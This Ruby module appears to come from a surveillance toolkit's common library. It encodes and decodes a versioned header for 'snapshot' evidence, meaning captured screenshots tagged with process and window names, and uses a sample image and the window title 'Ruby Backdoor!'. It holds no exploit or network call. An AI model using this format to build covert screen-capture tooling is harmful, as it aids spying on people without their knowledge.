require 'rcs-common/evidence/common'

module RCS

module SnapshotEvidence
  
  SNAPSHOT_VERSION = 2009031201
  
  def content
    path = File.join(File.dirname(__FILE__), 'content', 'snapshot', '001.jpg')
    File.open(path, 'rb') {|f| f.read }
  end
  
  def generate_content
    [ content ]
  end
  
  def additional_header
    process_name = 'ruby'.to_utf16le_binary
    window_name = 'Ruby Backdoor!'.to_utf16le_binary
    header = StringIO.new
    header.write [SNAPSHOT_VERSION, process_name.size, window_name.size].pack("I*")
    header.write process_name
    header.write window_name
    
    header.string
  end
  
  def decode_additional_header(data)
    raise EvidenceDeserializeError.new("incomplete evidence") if data.nil? or data.size == 0

    binary = StringIO.new data

    version, process_name_len, window_name_len = binary.read(12).unpack("I*")
    raise EvidenceDeserializeError.new("invalid log version for snapshot") unless version == SNAPSHOT_VERSION

    @info[:process_name] = binary.read(process_name_len).from_utf16le
    @info[:window_name] = binary.read(window_name_len).from_utf16le
  end
end

end # ::RCS